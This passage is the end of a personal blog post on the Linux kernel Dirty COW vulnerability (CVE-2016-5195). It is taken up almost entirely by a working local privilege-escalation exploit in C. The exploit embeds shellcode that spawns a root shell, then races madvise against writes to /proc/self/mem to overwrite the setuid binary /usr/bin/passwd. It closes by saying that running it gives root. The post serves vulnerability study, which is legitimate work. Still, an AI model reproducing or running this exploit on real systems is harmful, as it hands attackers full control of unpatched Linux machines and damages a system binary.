<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x95</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>,</span><br><span class="line">  <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x99</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x52</span>, <span class="number">0x5e</span>,</span><br><span class="line">  <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sc_len = <span class="number">149</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dst_fd, fk_fd;</span><br><span class="line">    dst_fd = open(<span class="string">&quot;/usr/bin/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of dst: %d\n&quot;</span>, dst_fd);</span><br><span class="line"></span><br><span class="line">    fstat(dst_fd, &amp;dst_st); <span class="comment">// get destination file length</span></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, dst_st.st_size, PROT_READ, MAP_PRIVATE, dst_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="type">off_t</span>) <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, sc, sc_len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Run it, and we can get the root.</p>
<p><img src="https://i.loli.net/2021/04/15/zy7V5Zu9AQdnREX.png" alt="image.png"></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>arttnba3</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://blog.arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/">http://blog.arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Pwn/"># Pwn</a>
                    
                        <a href="/tags/CVE/"># CVE</a>
                    
                        <a href="/tags/Linux-Kernel/"># Linux Kernel</a>
                    
                        <a href="/tags/Privilege-Escalating/"># Privilege Escalating</a>
                    
                        <a href="/tags/Dirty-Cow/"># Dirty Cow</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2000/10/12/hello-world/">Hello World</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>
            © 2022 arttnba3 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a>
        </span>
    </div>
</footer>

    </div>
</body>

</html>